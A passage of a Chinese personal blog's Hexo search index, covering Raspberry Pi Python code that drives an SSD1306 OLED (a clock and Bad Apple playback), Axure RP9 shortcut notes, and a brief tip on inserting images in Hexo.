&quot;Hello!&quot;</span><span class="hljs-comment">#    draw.text((0, 34), intro, font=font2, fill=255)</span><span class="hljs-comment">#    draw.text((0, 34), u&#x27;黄家星是沙雕&#x27;, font=font3, fill=255)</span>    now = datetime.datetime.now()    today_date = now.strftime(<span class="hljs-string">&quot;%d %b %y&quot;</span>)    today_time = now.strftime(<span class="hljs-string">&quot;%H:%M:%S&quot;</span>)    draw.text((x, top + <span class="hljs-number">35</span>), today_date, font=font, fill=<span class="hljs-number">255</span>)    draw.text((x, top + <span class="hljs-number">45</span>), today_time, font=font, fill=<span class="hljs-number">255</span>)    disp.image(image)    disp.show()    time.sleep(<span class="hljs-number">0.1</span>)</code></pre>例二、播放badapple<pre><code class="hljs python"><span class="hljs-keyword">import</span> time<span class="hljs-keyword">import</span> subprocess<span class="hljs-keyword">import</span> datetime<span class="hljs-keyword">from</span> board <span class="hljs-keyword">import</span> SCL, SDA<span class="hljs-keyword">import</span> busio<span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image, ImageDraw, ImageFont<span class="hljs-keyword">import</span> adafruit_ssd1306i2c = busio.I2C(SCL, SDA)disp = adafruit_ssd1306.SSD1306_I2C(<span class="hljs-number">128</span>, <span class="hljs-number">64</span>, i2c)disp.fill(<span class="hljs-number">0</span>)disp.show()width = disp.widthheight = disp.heightimage = Image.new(<span class="hljs-string">&quot;1&quot;</span>, (width, height))draw = ImageDraw.Draw(image)draw.rectangle((<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width, height), outline=<span class="hljs-number">0</span>, fill=<span class="hljs-number">0</span>)<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>,<span class="hljs-number">6551</span>):        disp.show()        image = Image.open(<span class="hljs-string">&quot;bad (&quot;</span>+str(i)+<span class="hljs-string">&quot;).png&quot;</span>).convert(<span class="hljs-string">&#x27;1&#x27;</span>)        disp.image(image)</code></pre><a href="badapple.tar.xz">资料</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>树莓派</category>
      
    </categories>
    
    
    <tags>
      
      <tag>树莓派</tag>
      
      <tag>12864 oled</tag>
      
      <tag>i2c</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>axure学习笔记</title>
    <link href="/2020/09/29/axure-notes/"/>
    <url>/2020/09/29/axure-notes/</url>
    
    <content type="html"><![CDATA[<h3 id="axure学习笔记"><a href="#axure学习笔记" class="headerlink" title="axure学习笔记"></a>axure学习笔记</h3><a id="more"></a><h4 id="一、常用快捷键"><a href="#一、常用快捷键" class="headerlink" title="一、常用快捷键"></a>一、常用快捷键</h4><pre><code class="hljs properties"><span class="hljs-attr">F5</span> <span class="hljs-string">生成预览</span><span class="hljs-attr">CTRL</span> <span class="hljs-string">+ Y  重做</span><span class="hljs-attr">CTRL</span> <span class="hljs-string">+ O  打开</span><span class="hljs-attr">CTRL</span> <span class="hljs-string">+ N  新建</span><span class="hljs-attr">CTRL</span> <span class="hljs-string">+ P  打印</span><span class="hljs-attr">CTRL</span> <span class="hljs-string">+ F  查找/替换</span><span class="hljs-attr">CTRL</span> <span class="hljs-string">+ G  群组</span><span class="hljs-attr">CTRL</span> <span class="hljs-string">+ SHIFT + G 取消群组</span><span class="hljs-attr">CTRL</span> <span class="hljs-string">+ K 锁定</span><span class="hljs-attr">CTRL</span> <span class="hljs-string">+ SHIFT + K 解锁</span><span class="hljs-attr">CTRL</span> <span class="hljs-string">+ &#x27; 显示网格</span><span class="hljs-attr">CTRL</span> <span class="hljs-string">+ SHITF + &#x27; 对齐网格</span><span class="hljs-attr">CTRL</span> <span class="hljs-string">+ SHIFT + . 锁定辅助线</span><span class="hljs-attr">CTRL</span> <span class="hljs-string">+ SHIFT + , 对齐辅助线</span><span class="hljs-meta">快捷复制</span> <span class="hljs-string">CTRL + 拖拽 （CTRL + D ）</span><span class="hljs-attr">页面滚动</span><span class="hljs-attr">垂直滚动：鼠标滚动</span><span class="hljs-meta">横向滚动：</span> <span class="hljs-string">SHIFT + 鼠标滚轮</span><span class="hljs-meta">放大缩小：CTRL</span> <span class="hljs-string">+ 滚轮</span><span class="hljs-attr">移动页面：按住空格键，然后鼠标拖动</span><span class="hljs-attr">图层顺序/分布</span><span class="hljs-meta">上移：</span> <span class="hljs-string">CTRL + ]</span><span class="hljs-meta">下移：</span> <span class="hljs-string">CTRL + [</span><span class="hljs-meta">置于顶层：</span> <span class="hljs-string">CTRL + SHIFT + ]</span><span class="hljs-meta">置于顶层：</span> <span class="hljs-string">CTRL + SHIFT + [</span><span class="hljs-meta">左对齐：</span> <span class="hljs-string">CTRL + ALT + L</span><span class="hljs-meta">右对齐：</span> <span class="hljs-string">CTRL + ALT + R</span><span class="hljs-meta">水平居中对齐：CTRL</span> <span class="hljs-string">+ ALT + C</span><span class="hljs-meta">垂直居中对齐：CTRL</span> <span class="hljs-string">+ ALT + M</span><span class="hljs-meta">顶端对齐：CTRL</span> <span class="hljs-string">+ ALT + T</span><span class="hljs-meta">底端对齐：CTRL</span> <span class="hljs-string">+ ALT + B</span><span class="hljs-meta">水平分布：CTRL</span> <span class="hljs-string">+ SHIFT + H</span><span class="hljs-meta">垂直分布：CTRL</span> <span class="hljs-string">+ SHIFT + U</span></code></pre><h4 id="二、页面操作"><a href="#二、页面操作" class="headerlink" title="二、页面操作"></a>二、页面操作</h4><ol><li>等比例调整：按住shift拖动 或点击高度旁小锁</li></ol><hr><img src="/2020/09/29/axure-notes/1.png" class title="slug"><hr><ol start="2"><li>批量调整元素</li></ol><hr>   <img src="/2020/09/29/axure-notes/2.png" class title="slug"><hr><ol start="3"><li>多个图片覆盖调整覆盖顺序</li></ol><hr><img src="/2020/09/29/axure-notes/3.jpg" class title="slug 图片"><img src="/2020/09/29/axure-notes/2.jpg" class title="slug 图片"><hr><ol start="4"><li>组件整体处理</li></ol><hr><img src="/2020/09/29/axure-notes/7.jpg" class title="slug 图片"><hr><ol start="5"><li>占位符意思</li></ol><hr><img src="/2020/09/29/axure-notes/3.png" class title="slug 图片"><hr><ol start="6"><li>矩形圆角，拖动黄色三角形即可</li></ol><hr><img src="/2020/09/29/axure-notes/4.png" class title="slug 图片"><hr><ol start="7"><li>导入图片，双击中间直接导入会根据，图片调整大小，双击边框正方形固定导入图片</li></ol><hr><img src="/2020/09/29/axure-notes/5.png" class title="slug 图片"><img src="/2020/09/29/axure-notes/6.png" class title="slug 图片"><hr><ol start="8"><li>输入框，右边交互输入提示文本和文本长度</li></ol><hr><img src="/2020/09/29/axure-notes/7.png" class title="slug 图片"><img src="/2020/09/29/axure-notes/9.png" class title="slug 图片"><hr><ol start="9"><li>下拉文本选择框，双击即可添加选项</li></ol><hr><img src="/2020/09/29/axure-notes/11.png" class title="slug 图片"><img src="/2020/09/29/axure-notes/10.png" class title="slug 图片"><hr>]]></content>
    
    
    <categories>
      
      <category>原型图</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Axure-PR9</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何导入图片?</title>
    <link href="/2020/09/18/My-fist-post/"/>
    <url>/2020/09/18/My-fist-post/</url>
    
    <content type="html"><![CDATA[<h3 id="hexo-导入图片"><a href="#hexo-导入图片" class="headerlink" title="hexo 导入图片"></a>hexo 导入图片</h3><img src="/2020/09/18/My-fist-post/1.jpg" class title="slug 图片"><hr><blockquote><p>HTML代码</p></blockquote><pre><code class="hljs HTML">&#123;% asset_img 1.jpg 图片 %&#125;</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
